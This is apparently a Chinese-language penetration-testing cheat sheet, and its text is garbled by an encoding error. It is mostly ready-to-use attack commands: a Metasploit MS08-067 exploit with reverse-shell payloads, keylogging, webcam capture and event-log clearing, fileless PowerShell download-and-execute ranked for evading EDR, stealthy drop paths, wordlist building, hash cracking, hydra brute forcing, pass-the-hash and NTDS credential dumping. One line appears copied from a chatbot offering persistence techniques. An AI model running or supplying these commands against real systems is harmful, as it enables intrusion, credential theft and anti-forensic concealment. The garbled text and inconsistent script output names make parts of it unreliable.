# Windows + Linux å·¥å…·

<details>

<summary>msfconsole</summary>

âœ… Metasploit Framework ç²¾ç°¡å¯¦æˆ°æ‰‹å†Š

ä»¥ä¸‹ä¾æ“šå¯¦æˆ°æµç¨‹é †åºæ•´ç†ï¼Œåƒ…ä¿ç•™æœ€é‡è¦æŒ‡ä»¤ï¼Œé©åˆåˆå­¸è€…å¿«é€Ÿä¸Šæ‰‹ã€‚

***

#### ğŸ§­ å¯¦æˆ°æµç¨‹è¡¨æ ¼ï¼š

| æ­¥é©Ÿ  | æ“ä½œå…§å®¹          | æŒ‡ä»¤æˆ–èªªæ˜                                                                                                                     |
| --- | ------------- | ------------------------------------------------------------------------------------------------------------------------- |
| 1ï¸âƒ£ | å•Ÿå‹• Metasploit | `msfconsole`                                                                                                              |
| 2ï¸âƒ£ | æœå°‹æ¼æ´æ¨¡çµ„        | `search ms08_067`                                                                                                         |
| 3ï¸âƒ£ | è¼‰å…¥æ¨¡çµ„          | `use exploit/windows/smb/ms08_067_netapi`                                                                                 |
| 4ï¸âƒ£ | æŸ¥çœ‹åƒæ•¸          | `show options`                                                                                                            |
| 5ï¸âƒ£ | è¨­å®šåƒæ•¸          | `set RHOSTS <ç›®æ¨™IP>set LHOST <æœ¬æ©ŸIP>set LPORT 4444`                                                                         |
| 6ï¸âƒ£ | è¨­å®š Payload    | `set payload windows/meterpreter/reverse_tcp`                                                                             |
| 7ï¸âƒ£ | é¡å¤– Payload é¸æ“‡ | `windows/meterpreter/reverse_httpswindows/shell/reverse_tcplinux/x86/meterpreter/reverse_tcpwindows/meterpreter/bind_tcp` |
| 8ï¸âƒ£ | å†æ¬¡ç¢ºèªè¨­å®š        | `show options`                                                                                                            |
| 9ï¸âƒ£ | åŸ·è¡Œæ”»æ“Š          | `exploit`                                                                                                                 |
| ğŸ”Ÿ  | æ§åˆ¶ç›®æ¨™          | `sessions -lsessions -i 1`                                                                                                |

***

#### ğŸ› ï¸ å¾Œæ»²é€å¸¸ç”¨æŒ‡ä»¤ï¼š

| åŠŸèƒ½        | æŒ‡ä»¤                    |
| --------- | --------------------- |
| ææ¬Š        | `getsystem`           |
| æŸ¥çœ‹ç¨‹åº      | `ps`                  |
| é·ç§»é€²ç¨‹      | `migrate <PID>`       |
| Dump hash | `hashdump`            |
| ä¸Šå‚³æª”æ¡ˆ      | `upload <æœ¬åœ°> <ç›®æ¨™è·¯å¾‘>`  |
| åŸ·è¡Œæª”æ¡ˆ      | `execute -f <æª”æ¡ˆå> -i` |

***

#### ğŸ“¦ ä¸Šå‚³èˆ‡ä¸‹è¼‰æª”æ¡ˆï¼š

| é¡å‹          | æŒ‡ä»¤ç¯„ä¾‹                                                    |
| ----------- | ------------------------------------------------------- |
| ä¸Šå‚³è‡³ Linux   | `upload C:\Users\attacker\payload.exe /tmp/payload.exe` |
| ä¸Šå‚³è‡³ Windows | `upload /root/file.txt C:\Windows\Temp\file.txt`        |
| å¾ç›®æ¨™ä¸‹è¼‰       | `download C:\Users\victim\secret.docx ./secret.docx`    |

***

#### ğŸ–¼ï¸ å»¶ä¼¸å¾Œæ»²é€åŠŸèƒ½ï¼š

| åŠŸèƒ½      | æŒ‡ä»¤                                            | èªªæ˜                           |
| ------- | --------------------------------------------- | ---------------------------- |
| æ“·å–è¢å¹•ç•«é¢  | `screenshot`                                  | æˆªå–ç›®æ¨™ä½¿ç”¨è€…ç•¶å‰è¢å¹•ç•«é¢                |
| éµç›¤å´éŒ„é–‹å§‹  | `keyscan_start`                               | å•Ÿå‹•éµç›¤è¨˜éŒ„å™¨                      |
| éµç›¤å´éŒ„åŒ¯å‡º  | `keyscan_dump`                                | åŒ¯å‡ºå·²å´éŒ„çš„æŒ‰éµè³‡æ–™                   |
| åœæ­¢éµç›¤å´éŒ„  | `keyscan_stop`                                | åœæ­¢éµç›¤è¨˜éŒ„å™¨                      |
| é–‹å•Ÿæ”å½±æ©Ÿ   | `webcam_list`, `webcam_snap`                  | é¡¯ç¤ºå¯ç”¨æ”å½±æ©Ÿï¼Œæ“·å–å½±åƒï¼ˆéœ€æ”¯æ´ï¼‰            |
| èª¿æ•´æ¡Œé¢æ§åˆ¶æ¬Š | `uictl enable keyboard`, `uictl enable mouse` | æ§åˆ¶ç›®æ¨™éµç›¤èˆ‡æ»‘é¼                     |
| ç³»çµ±æ¡Œé¢åˆ‡æ›  | `setdesktop <ID>`                             | åˆ‡æ›è‡³å…¶ä»–ä½¿ç”¨è€…æ¡Œé¢ï¼ˆéœ€å…·å‚™æœƒè©±ï¼‰            |
| å½é€ æª”æ¡ˆæ™‚é–“  | `timestomp`                                   | ä¿®æ”¹æª”æ¡ˆå»ºç«‹/ä¿®æ”¹/å­˜å–æ™‚é–“ï¼Œå¸¸ç”¨æ–¼åå–è­‰        |
| æ¸…é™¤äº‹ä»¶ç´€éŒ„  | `clearev`                                     | æ¸…é™¤ç³»çµ± event logï¼ˆå¸¸æ­é…ææ¬Šå¾ŒåŸ·è¡Œï¼‰     |
| æª¢è¦–ç’°å¢ƒè®Šæ•¸  | `getenv`                                      | æŸ¥çœ‹ç›®æ¨™ç³»çµ±çš„é‡è¦ç’°å¢ƒè®Šæ•¸è³‡è¨Š              |
| æ³¨å…¥é€²ç¨‹    | `inject`                                      | å°‡ shellcode æ³¨å…¥åˆ°ç¾æœ‰ç¨‹åºï¼ˆéœ€æ­é…é€²éšæ¨¡çµ„ï¼‰ |
| å»ºç«‹å¸³è™Ÿ    | `run post/windows/manage/add_user`            | åœ¨ç›®æ¨™ç³»çµ±å»ºç«‹éš±è—å¸³è™Ÿï¼ˆéœ€ç®¡ç†å“¡ï¼‰            |
| æ–°å¢å¸³è™Ÿåˆ°ç¾¤çµ„ | `net localgroup administrators <user> /add`   | æ·»åŠ ä½¿ç”¨è€…è‡³ç®¡ç†ç¾¤çµ„ï¼ˆæ‰‹å‹•ï¼‰               |

| åŠŸèƒ½   | æŒ‡ä»¤                                            |
| ---- | --------------------------------------------- |
| æ“·å–è¢å¹• | `screenshot`                                  |
| éµç›¤å´éŒ„ | `keyscan_start`ã€`keyscan_dump`ã€`keyscan_stop` |
| æ¸…é™¤äº‹ä»¶ | `clearev`                                     |

***

ğŸ’¡ **æç¤º**ï¼šå¯å°‡æŒ‡ä»¤å¯«å…¥ `.rc` è‡ªå‹•åŒ–è…³æœ¬ï¼š

```bash
msfconsole -r /root/demo.rc
```

***

é€™å°±æ˜¯å¯¦æˆ°ä¸­æœ€å¸¸è¦‹ã€æœ€å¯¦ç”¨çš„ 10 æ­¥é©Ÿæµç¨‹è¡¨æ ¼ï¼Œæ­é…å»¶ä¼¸å¾Œæ»²é€æŠ€å·§ã€‚ç·´ç†Ÿé€™ä»½è¡¨æ ¼ï¼Œçµ•å°èƒ½æ‰“ç©¿ 80% é¶æ©Ÿã€‚éœ€è¦æˆ‘å†è£œä¸Šè‡ªå‹•ææ¬Šæ¨¡çµ„ã€æŒä¹…åŒ–æŠ€å·§ã€æˆ–ç”Ÿæˆ PDF å—ï¼ŸğŸ“„

</details>

<details>

<summary>æ–‡ä»¶å‚³é€ Windows / Linux ä¸‹è¼‰</summary>

ğŸ“Š æª”æ¡ˆè½åœ°æ–¹å¼æ¯”è¼ƒè¡¨ï¼ˆå¸¸ç”¨æŒ‡æ•¸ â­â­â­â­â­ï¼‰

| å‚³é€æ–¹å¼                               | æŒ‡ä»¤ç¯„ä¾‹                                                                        | å¸¸ç”¨æŒ‡æ•¸  | å‚™è¨»                         |
| ---------------------------------- | --------------------------------------------------------------------------- | ----- | -------------------------- |
| **PowerShell - Invoke-WebRequest** | Invoke-WebRequest -Uri [http://x](http://x/) -OutFile file.exe              | â­â­â­â­â­ | æœ€å¸¸è¦‹ï¼Œå…¼å®¹æ€§é«˜                   |
| **PowerShell - IEX è¨˜æ†¶é«”åŸ·è¡Œ**         | IEX (New-Object Net.WebClient).DownloadString('[http://x](http://x/)')      | â­â­â­â­â­ | ç„¡æª”æ¡ˆè½åœ°ã€é©åˆéš±è”½æ”»æ“Š               |
| **certutilï¼ˆç„¡ PowerShell ç’°å¢ƒï¼‰**      | certutil -urlcache -split -f [http://x](http://x/) file.exe                 | â­â­â­â­  | åœ¨ä¸æ”¯æ´ PS çš„æ©Ÿå™¨ä¸Šè¶…æœ‰ç”¨            |
| **bitsadminï¼ˆèˆŠï¼‰**                   | bitsadmin /transfer job [http://x](http://x/) file.exe                      | â­â­    | è¢«æ·˜æ±°ï¼ŒèˆŠç‰ˆ Windows æ‰ç”¨          |
| **curl/wget (Linux)**              | curl -o /tmp/x [http://x](http://x/) / wget -O /tmp/x [http://x](http://x/) | â­â­â­â­  | Linux ä¸Šç‹è€…                  |
| **PHP file\_get\_contents**        | php -r '...file\_get\_contents...'                                          | â­â­    | ç”¨æ–¼ PHP å¯åŸ·è¡Œçš„ç’°å¢ƒï¼ˆä¾‹å¦‚ Webshellï¼‰ |
| **SCPï¼ˆéœ€ SSH é–‹å•Ÿï¼‰**                  | scp file user@ip:/tmp/                                                      | â­â­    | å®‰å…¨ä½†æœ‰ SSH é™åˆ¶                |
| **pyftpdlib FTP ä¼ºæœå™¨**              | python3 -m pyftpdlib -p 2121                                                | â­â­    | å¿«é€Ÿå»º FTPï¼Œé©åˆè‡¨æ™‚ç’°å¢ƒ             |
| **Python http.server**             | python3 -m http.server 8000                                                 | â­â­â­â­â­ | æ”»æ“Šæ©Ÿè¨­ç½® payload server çš„æœ€æ„›   |
| **impacket-smbserverï¼ˆSMB åˆ†äº«ï¼‰**     | impacket-smbserver share /tmp                                               | â­â­â­â­  | é©ç”¨æ–¼ Windows SMB æ‹“æ’²ä¸‹çš„å…§ç¶²     |

ğŸ” å¸¸ç”¨è½åœ°è·¯å¾‘ï¼ˆéš±è”½åº¦æ’åï¼‰

| è·¯å¾‘                            | éš±è”½æ˜Ÿç­‰  | ç†ç”±                     |
| ----------------------------- | ----- | ---------------------- |
| C:\ProgramData\\              | â­â­â­â­â­ | é è¨­è³‡æ–™å¤¾ï¼Œæ¬Šé™å¯¬é¬†ï¼Œä¸æ˜“åµæ¸¬        |
| C:\Users\Public\\             | â­â­â­â­  | å…è¨±æ‰€æœ‰äººå¯«å…¥ï¼Œåˆæ³•æ€§é«˜           |
| %APPDATA%\Microsoft\Windows\\ | â­â­â­â­  | ç³»çµ±è¨­å®šä½ç½®ï¼Œåç¨±å¯å½è£æˆ legit ç¨‹åº |
| %TEMP%                        | â­â­â­   | é›–ç„¶é¡¯çœ¼ï¼Œä½†é˜²æ¯’é€šå¸¸ä¸å³æ™‚æ¸…æŸ¥        |

ğŸ† ç¸½çµå»ºè­°ï¼ˆæœ€æ¨è–¦çµ„åˆï¼‰

| ç›®çš„             | æ¨è–¦æ–¹æ³•                                            | ç†ç”±               |
| -------------- | ----------------------------------------------- | ---------------- |
| å¿«é€Ÿå‚³é€ + è½åœ°      | PowerShell Invoke-WebRequest + C:\ProgramData\\ | æˆåŠŸç‡æœ€é«˜            |
| éš±è”½åŸ·è¡Œ           | PowerShell IEX + ä¸å¯«å…¥ç£ç¢Ÿ                          | è¶…é›£åµæ¸¬ï¼Œé©åˆèº²é EDR    |
| ç„¡ PowerShell æ™‚ | certutil                                        | å¹¾ä¹æ‰€æœ‰ Windows éƒ½å…§å»º |
| Linux ç›®æ¨™       | wget / curl + /tmp                              | ç°¡å–®å¿«é€Ÿ             |
| Webshell       | PHP file\_get\_contents                         | Webserver å‚³æª”é¦–é¸   |



</details>

<details>

<summary>å¯†ç¢¼å­—å…¸å»ºç«‹ +  Windows/ Linux å¯†ç¢¼çˆ†ç ´æ”»æ“Š(Online)</summary>

**1ï¸âƒ£ è³‡è¨Šè’é›†ï¼ˆå­—å…¸å»ºç«‹éšæ®µï¼‰**

<table><thead><tr><th width="112.09765625">æ­¥é©Ÿ</th><th width="239.7578125">æŒ‡ä»¤</th><th>ç”¨é€”èªªæ˜</th><th>è¼¸å‡ºæª”æ¡ˆ</th></tr></thead><tbody><tr><td>1ï¸âƒ£ æ“·å–ç¶²ç«™æ–‡å­—å…§å®¹</td><td><code>cewl https://target.com -d 2 -m 3 > raw.txt</code></td><td>è‡ªå‹•æ“·å–æ•´å€‹ç¶²ç«™æ–‡å­—å…§å®¹ï¼ˆäººå/è·ç¨±/æè¿°ï¼‰</td><td><code>raw.txt</code></td></tr><tr><td>2ï¸âƒ£ å¾å…§å®¹ä¸­æ‰¾å‡ºäººå</td><td><code>grep -E '[A-Z][a-z]{2,} [A-Z][a-z]{2,}' raw.txt > names_auto.txt</code></td><td>å¾ç¶²ç«™æ–‡å­—ä¸­æŠ“å‡ºã€Œåå­— å§“æ°ã€æ ¼å¼è©å½™</td><td><code>names_auto.txt</code></td></tr><tr><td>3ï¸âƒ£ æ‰‹å‹•è£œå……äººåæ¸…å–®</td><td>âœï¸ æ‰‹å‹•å»ºç«‹æˆ–ç·¨è¼¯ <code>names_manual.txt</code></td><td>å¦‚æœæœ‰ä½ è‡ªè¡Œè§€å¯Ÿå¾—å‡ºçš„äººåï¼Œå¯æ‰‹å‹•è£œé€²æ¸…å–®</td><td><code>names_manual.txt</code></td></tr><tr><td>4ï¸âƒ£ åˆä½µè‡ªå‹• + æ‰‹å‹•æ¸…å–®</td><td><code>cat names_auto.txt names_manual.txt > names_combined.txt</code></td><td>å°‡å…©è€…æ•´åˆç‚ºæœ€å®Œæ•´äººåä¾†æº</td><td><code>names_combined.txt</code></td></tr><tr><td>5ï¸âƒ£ æ·¨åŒ–é‡è¤‡äººå</td><td><code>sort -u names_combined.txt > names.txt</code></td><td>å»é™¤é‡è¤‡ã€çµ±ä¸€æ ¼å¼ï¼Œç”Ÿæˆä¹¾æ·¨äººåæ¸…å–®</td><td>âœ… <code>names.txt</code></td></tr><tr><td>6ï¸âƒ£ è½‰æ›ç‚ºå¸³è™Ÿæ ¼å¼</td><td><code>./username-anarchy -i names.txt > user.list</code></td><td>ä½¿ç”¨å·¥å…·å°‡äººåè½‰ç‚ºå¸¸è¦‹ä½¿ç”¨è€…åç¨±æ ¼å¼</td><td>âœ… <code>usernames.txt</code>ï¼ˆç”¨æ–¼ hydra -Lï¼‰</td></tr></tbody></table>

***

```bash
#!/bin/bash

# âœ… ä½¿ç”¨æ–¹å¼ï¼š
# bash build_usernames.sh <ç›®æ¨™ç¶²å€> <æ‰‹å‹•äººåæ¸…å–®>

if [ "$#" -ne 2 ]; then
    echo "ç”¨æ³•ï¼š$0 <ç›®æ¨™ç¶²å€> <æ‰‹å‹•äººåæ¸…å–®>"
    exit 1
fi

TARGET_URL="$1"
MANUAL_NAMES="$2"

echo "[+] ä½¿ç”¨ cewl æ“·å–ç¶²ç«™å…§å®¹..."
cewl "$TARGET_URL" -d 2 -m 3 > raw.txt

echo "[+] ä½¿ç”¨ grep æ“·å–äººåæ ¼å¼..."
grep -E '[A-Z][a-z]{2,} [A-Z][a-z]{2,}' raw.txt > names_auto.txt

echo "[+] åˆä½µè‡ªå‹•èˆ‡æ‰‹å‹•äººåæ¸…å–®..."
cat names_auto.txt "$MANUAL_NAMES" > names_combined.txt

echo "[+] æ·¨åŒ–ä¸¦å»é™¤é‡è¤‡..."
sort -u names_combined.txt > names.txt

echo "[+] ä½¿ç”¨ username-anarchy ç”¢ç”Ÿå¸³è™Ÿæ ¼å¼..."
./username-anarchy -i names.txt > user.list

echo "[âœ“] å®Œæˆï¼å¸³è™Ÿå­—å…¸è¼¸å‡ºæ–¼ï¼šusernames.txt"

```



| æ­¥é©Ÿ        | æŒ‡ä»¤                                                                                                 | ç”¨é€”èªªæ˜                  | è¼¸å‡ºæª”æ¡ˆ                                 |
| --------- | -------------------------------------------------------------------------------------------------- | --------------------- | ------------------------------------ |
| 1ï¸âƒ£       | `cewl https://target.com -d 3 -m 6 --lowercase -w base_wordlist.txt`                               | å¾ç¶²ç«™æ“·å–æœ‰èªæ„çš„é—œéµå­—ä½œç‚ºå¯†ç¢¼å­—å…¸èµ·é»  | `base_wordlist.txt`                  |
| 2ï¸âƒ£       | `hashcat -r /usr/share/hashcat/rules/best64.rule base_wordlist.txt --stdout > strong_wordlist.txt` | ä½¿ç”¨è¦å‰‡å°‡è©å½™è®Šå½¢ï¼ˆåŠ æ•¸å­—ã€å¤§å°å¯«ã€å¹´ä»½ï¼‰ | `strong_wordlist.txt`                |
| 3ï¸âƒ£       | `awk '{print $1\"123\"}' strong_wordlist.txt > strong_123.txt`                                     | é¡å¤–è‡ªå®šå¸¸è¦‹çµå°¾è®ŠåŒ–            | `strong_123.txt`                     |
| 4ï¸âƒ£       | `cat strong_wordlist.txt strong_123.txt \| sort -u > password.list`                                |                       | åˆä½µæ‰€æœ‰å¯†ç¢¼ç‰ˆæœ¬ï¼Œæ•´ç†å»é‡                        |
| â˜‘ï¸ **å®Œæˆ** | **é€™ä»½å¯†ç¢¼å­—å…¸æœƒè¢«ç”¨æ–¼ hydra çš„ -P**                                                                          | -                     | ä½¿ç”¨æ™‚ï¼š`hydra -P mega_wordlist.txt ...` |

**3ï¸âƒ£ ç ´è§£å¯†ç¢¼ï¼ˆé›¢ç·šæ¨¡å¼ï¼‰(é¸é …å¦‚æœä¿‚æ”åˆ°hashå˜…è©±) (æ‰€æœ‰éœ€è¦è§£å¯†)**

| â­     | æŒ‡ä»¤                                                                                            | èªªæ˜                       | æ”»æ“Šå‰æ                                   |
| ----- | --------------------------------------------------------------------------------------------- | ------------------------ | -------------------------------------- |
| â­â­â­â­â­ | `hashcat -m 1000 dumpedhashes.txt rockyou.txt`                                                | ç ´è§£ NTLM hashï¼ˆWindows å¯†ç¢¼ï¼‰ | âœ”ï¸ NTLM hash (å¦‚å¾ SAM æˆ– secretsdump æ‹¿åˆ°) |
| â­â­â­â­â­ | `john --wordlist=rockyou.txt zip.hash`                                                        | ç ´è§£ zip åŠ å¯†å£“ç¸®åŒ…å¯†ç¢¼           | âœ”ï¸ ä½¿ç”¨ `zip2john` å…ˆç”¢å‡º zip.hash          |
| â­â­â­â­  | `hashcat -m 1000 <hash> rockyou.txt --show`                                                   | ç ´è§£å–®ä¸€ NTLM hash ä¸¦å³æ™‚é¡¯ç¤ºçµæœ   | âœ”ï¸ ä¸€çµ„ hash å€¼ã€å­—å…¸æª”                       |
| â­â­â­â­  | `unshadow /etc/passwd /etc/shadow > unshadowed.hashes`                                        | æ•´åˆ Linux å¸³å¯†ç‚ºä¸€å€‹ hash æª”    | âœ”ï¸ æ‹¿åˆ° Linux çš„ passwd & shadow æª”æ¡ˆ       |
| â­â­â­â­  | `hashcat -m 1800 -a 0 unshadowed.hashes rockyou.txt -o cracked.txt`                           | ç ´è§£ Linux hashï¼Œè¼¸å‡ºçµæœæª”      | âœ”ï¸ ä½¿ç”¨ unshadow åˆæˆçš„ hash æª”              |
| â­â­â­â­  | `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`                                             | ç ´è§£ MD5 hash              | âœ”ï¸ hash é¡å‹ç‚º MD5ï¼Œå·²çŸ¥æ ¼å¼                   |
| â­â­â­â­  | `zip2john file.zip > zip.hash`                                                                | ç”Ÿæˆ zip hashï¼Œä¾› john ä½¿ç”¨    | âœ”ï¸ æœ‰åŠ å¯†çš„ zip å£“ç¸®æª”                        |
| â­â­â­â­  | `john --wordlist=rockyou.txt zip.hash`                                                        | å° zip.hash å˜—è©¦çˆ†ç ´å¯†ç¢¼        | âœ”ï¸ ç”¨ zip2john ç”¢å‡º hash                  |
| â­â­â­â­  | `office2john.py Protected.docx > protected-docx.hash`                                         | å°‡åŠ å¯† Office æ–‡ä»¶è½‰ç‚º hash     | âœ”ï¸ æœ‰å—ä¿è­·çš„ Word æª”æ¡ˆ                       |
| â­â­â­â­  | `john --wordlist=rockyou.txt protected-docx.hash`                                             | ç ´è§£ Office æ–‡ä»¶å¯†ç¢¼           | âœ”ï¸ ä¸Šä¸€æ­¥ç”¢å‡ºçš„ hash                         |
| â­â­â­â­  | `bitlocker2john -i Backup.vhd > backup.hashes`                                                | å¾ BitLocker å®¹å™¨æå– hash    | âœ”ï¸ æœ‰ `.vhd` ç£ç¢Ÿå½±åƒæª”                      |
| â­â­â­â­  | `hashcat -m 22100 backup.hash rockyou.txt -o backup.cracked`                                  | ç ´è§£ BitLocker hash        | âœ”ï¸ æœ‰ backup.hash + å­—å…¸                  |
| â­â­â­   | `python3 ssh2john.py id_rsa > ssh.hash`                                                       | å°‡ SSH ç§é‘°è½‰æ›æˆ hashï¼ˆä¾›ç ´è§£ï¼‰    | âœ”ï¸ æœ‰ SSH é‡‘é‘°æª”                           |
| â­â­â­   | `john ssh.hash --show`                                                                        | ç ´è§£ SSH ç§é‘°å¯†ç¢¼              | âœ”ï¸ å·²ç”¢ç”Ÿ hash æª”                          |
| â­â­â­   | `pdf2john.pl secret.pdf > pdf.hash`                                                           | å°‡åŠ å¯† PDF è½‰æ›æˆ hash æª”       | âœ”ï¸ æœ‰å—ä¿è­·çš„ PDF æ–‡ä»¶                        |
| â­â­â­   | `john --wordlist=rockyou.txt pdf.hash`                                                        | å˜—è©¦çˆ†ç ´ PDF æª”æ¡ˆå¯†ç¢¼            | âœ”ï¸ ä¸Šä¸€æ­¥ hash çµæœ                         |
| â­â­    | `file GZIP.gzip`                                                                              | åˆ¤æ–·æª”æ¡ˆæ ¼å¼ï¼ˆåµæ¸¬ GZIP é¡å‹ï¼‰       | âœ”ï¸ æœ‰å£“ç¸®åŠ å¯†æª”ï¼Œéœ€ç¢ºèªæ ¼å¼                        |
| â­â­    | \`for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz; done\`           | ç”¨å­—å…¸ä¸€å€‹å€‹çˆ† AES è§£å¯† gzip                    |

**4ï¸âƒ£ çˆ†ç ´ç™»å…¥ï¼ˆç·šä¸Šæ¸¬è©¦å¸³å¯†ï¼‰(Windows çˆ†ç ´) (Linux çˆ†ç ´)**&#x20;

| â­     | æŒ‡ä»¤                                                             | æè¿°                            | âš ï¸ æ”»æ“Šå‰ç½®æ¢ä»¶                                    |
| ----- | -------------------------------------------------------------- | ----------------------------- | -------------------------------------------- |
| â­â­â­â­â­ | `hydra -L user.list -P password.list <service>://<ip>`         | ä½¿ç”¨å¸³å¯†æ¸…å–®çˆ†ç ´ SSHã€RDPã€Web Login ç­‰  | <p>âœ”ï¸ æœå‹™å·²é–‹å•Ÿï¼ˆå¯é€£ç·šï¼‰<br>âœ”ï¸ ç”¨æˆ¶æ¸…å–®èˆ‡å¯†ç¢¼å­—å…¸æº–å‚™å¥½</p>      |
| â­â­â­â­  | `hydra -C userpass.list ssh://<ip>`                            | ä½¿ç”¨ user:pass æ ¼å¼çˆ†ç ´ï¼ˆæ†‘è­‰å¡«å……ï¼‰       | <p>âœ”ï¸ SSH å¯é€£ç·š<br>âœ”ï¸ å·²æŠ“å–çš„å¸³å¯†çµ„åˆæ¸…å–®</p>           |
| â­â­â­â­  | `hydra -l username -P password.list <service>://<ip>`          | é‡å°å–®ä¸€å¸³è™Ÿï¼Œçˆ†ç ´å…¶å¯èƒ½å¯†ç¢¼                | <p>âœ”ï¸ ç¢ºå®šå¸³è™Ÿåç¨±<br>âœ”ï¸ å¯†ç¢¼å­—å…¸æº–å‚™å¥½</p>               |
| â­â­â­â­  | `hydra -L user.list -p password <service>://<ip>`              | ç”¨ä¸€çµ„å¯†ç¢¼çˆ†ç ´å¤šå€‹å¸³è™Ÿ                   | <p>âœ”ï¸ å¸¸è¦‹å¼±å¯†ç¢¼ï¼ˆå¦‚ï¼š123456ï¼‰<br>âœ”ï¸ å¸³è™Ÿæ¸…å–®æº–å‚™å¥½</p>      |
| â­â­â­â­  | `evil-winrm -i <ip> -u Administrator -H "<hash>"`              | ä½¿ç”¨å“ˆå¸Œç™»å…¥ Windowsï¼ˆPass-The-Hashï¼‰ | <p>âœ”ï¸ ç›®æ¨™é–‹å•Ÿ WinRMï¼ˆ5985ï¼‰<br>âœ”ï¸ æœ‰ NTLM hash</p> |
| â­â­â­â­  | `crackmapexec winrm <ip> -u user.list -p password.list`        | ä½¿ç”¨ CrackMapExec çˆ†ç ´ WinRM      | <p>âœ”ï¸ æœ‰ä½¿ç”¨è€…æ¸…å–®<br>âœ”ï¸ ç›®æ¨™é–‹å•Ÿ WinRM æœå‹™</p>         |
| â­â­â­   | `crackmapexec smb <ip> -u "user" -p "password" --shares`       | ç”¨å¸³å¯†ç™»å…¥ SMB ä¸¦åˆ—å‡ºå…±äº«è³‡æ–™å¤¾            | <p>âœ”ï¸ å¸³å¯†çµ„åˆå·²çŸ¥<br>âœ”ï¸ ç›®æ¨™é–‹å•Ÿ 445 portï¼ˆSMBï¼‰</p>    |
| â­â­â­   | `crackmapexec smb <ip> --local-auth -u <user> -p <pass> --sam` | å°å‡ºæœ¬åœ° SAM å¯†ç¢¼ hash              | <p>âœ”ï¸ æœ‰ç›®æ¨™æœ¬æ©Ÿå¸³è™Ÿèˆ‡å¯†ç¢¼<br>âœ”ï¸ è©²å¸³è™Ÿç‚º local admin</p>  |
| â­â­â­   | `crackmapexec smb <ip> --local-auth -u <user> -p <pass> --lsa` | è®€å– LSA secretsï¼Œå¯èƒ½æ‹¿åˆ°æ˜æ–‡å¯†ç¢¼       | <p>âœ”ï¸ æœ¬åœ° admin æ¬Šé™<br>âœ”ï¸ SMB port å¯é€£ç·š</p>     |
| â­â­â­   | `crackmapexec smb <ip> -u <user> -p <pass> --ntds`             | å¾ NTDS æŠ½å–æ•´å€‹åŸŸå…§å¸³å¯† hash          | <p>âœ”ï¸ admin æ¬Šé™å¸³è™Ÿ<br>âœ”ï¸ ç›®æ¨™ç‚ºåŸŸæ§æˆ–æœ‰è¤‡è£½ NTDS æ¬Šé™</p> |

</details>

<details>

<summary>é è¨­æ†‘è­‰</summary>

ä»¥ä¸‹æ˜¯ **DefaultCreds-cheat-sheet ä½¿ç”¨æ•™å­¸** çš„æ­¥é©Ÿè¡¨æ ¼æ•´ç†ï¼Œè®“ä½ ä¸€ç›®äº†ç„¶ï¼š

<table><thead><tr><th width="64.55859375">æ­¥é©Ÿ</th><th>æ“ä½œèªªæ˜</th><th>å‘½ä»¤/å·¥å…·</th><th>é æœŸçµæœ</th><th>å¦‚æœå‡ºéŒ¯è©²æ€éº¼è¾¦</th></tr></thead><tbody><tr><td>1ï¸âƒ£</td><td>å®‰è£å·¥å…·</td><td><code>pip3 install defaultcreds-cheat-sheet</code></td><td>å®‰è£æˆåŠŸå¾Œå¯ä»¥ä½¿ç”¨ <code>creds</code> æŒ‡ä»¤</td><td>è‹¥ç„¡æ³•å®‰è£ï¼š<br>â‘  ç¢ºèªå·²å®‰è£ Python3/pip3<br>â‘¡ æª¢æŸ¥ç¶²è·¯<br>â‘¢ å˜—è©¦æ‰‹å‹•å®‰è£</td></tr><tr><td>2ï¸âƒ£</td><td>æ‰‹å‹•å®‰è£ï¼ˆå¦‚æ­¥é©Ÿ1å¤±æ•—ï¼‰</td><td>git clone <a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a><br>cd DefaultCreds-cheat-sheet<br>pip3 install -r requirements.txt<br>cp creds /usr/bin/ &#x26;&#x26; chmod +x /usr/bin/creds</td><td>å°‡ <code>creds</code> å‘½ä»¤åŠ å…¥å¯åŸ·è¡Œç’°å¢ƒ</td><td>è‹¥ <code>creds</code> ç„¡æ³•åŸ·è¡Œï¼Œç¢ºèª <code>/usr/bin/creds</code> æ¬Šé™èˆ‡ç’°å¢ƒè®Šæ•¸</td></tr><tr><td>3ï¸âƒ£</td><td>æœå°‹é è¨­å¸³å¯†</td><td><code>creds search tomcat</code></td><td>åˆ—å‡º Apache Tomcat çš„é è¨­å¸³å¯†ï¼Œå¦‚ <code>admin:admin</code></td><td>è‹¥ç„¡çµæœï¼Œå˜—è©¦ä¸åŒé—œéµå­—ï¼Œä¾‹å¦‚ <code>apache</code></td></tr><tr><td>4ï¸âƒ£</td><td>ç¯©é¸å‡ºæ‰€æœ‰è¨­å‚™é¡å‹</td><td><code>creds dump</code></td><td>åˆ—å‡ºæ‰€æœ‰æ”¯æ´æŸ¥è©¢çš„è¨­å‚™èˆ‡æ‡‰ç”¨ç¨‹å¼é¡å‹</td><td>çµæœå¤ªå¤šå¯åŠ ä¸Š `</td></tr><tr><td>5ï¸âƒ£</td><td>å¯¦éš›æ‡‰ç”¨å¸³å¯†ç™»å…¥ç›®æ¨™</td><td>ä¾æ“šæŸ¥åˆ°çš„å¸³å¯†ç™»å…¥ Webã€FTPã€SSH ç­‰æœå‹™</td><td>æ¸¬è©¦æ˜¯å¦èƒ½æˆåŠŸç™»å…¥</td><td>è‹¥å¤±æ•—ï¼Œä»£è¡¨ç›®æ¨™å·²æ”¹å¯†ï¼Œå»ºè­°ç¹¼çºŒå…¶ä»–æ¸¬è©¦æ‰‹æ³•</td></tr><tr><td>6ï¸âƒ£</td><td>å°ç‰¹å®šè¨­å‚™é¡å‹åˆ—å‡ºå¸³å¯†</td><td>`creds dump</td><td>grep -i cisco`</td><td>ç¯©å‡ºæ‰€æœ‰ Cisco è¨­å‚™å¸³å¯†</td></tr></tbody></table>

</details>

**Windows æ¬Šé™åµå¯Ÿèˆ‡å¾ŒçºŒè¡Œå‹•è¡¨æ ¼ï¼ˆå«å§¿å‹¢åˆ¤æ–· + å®Œæ•´æŒ‡ä»¤ï¼‰**

| æŒ‡ä»¤                                                                                                             | æª¢æŸ¥é»ï¼ˆé€²éšå§¿å‹¢ï¼‰                                                                                                                                                                                                                                                                                                                      | è‹¥ç™¼ç¾ç›®æ¨™                                                         | ä¸‹ä¸€æ­¥è¡Œå‹•                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
